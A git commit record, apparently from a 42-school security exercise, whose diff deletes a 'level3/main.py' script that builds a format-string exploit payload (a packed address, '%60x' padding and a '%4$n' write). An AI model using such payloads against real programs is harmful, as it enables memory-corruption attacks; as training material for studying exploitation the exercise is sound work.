19e78e356f6d58b0717d0cd7414766630ea23834
Clement Morel <cmorel@3G3.42angouleme.fr>
2026-01-22 15:18:02 +0100

    useless main.py

--- level3/main.py
+++
@@ -1,8 +0,0 @@
-import struct
-
-addr = 0x0804988c
-payload = struct.pack('<I', addr)  # 4 bytes
-payload += "%60x"                  # 60 caractères
-payload += "%4$n"                  # Écrire à arg 4
-
-print (payload)
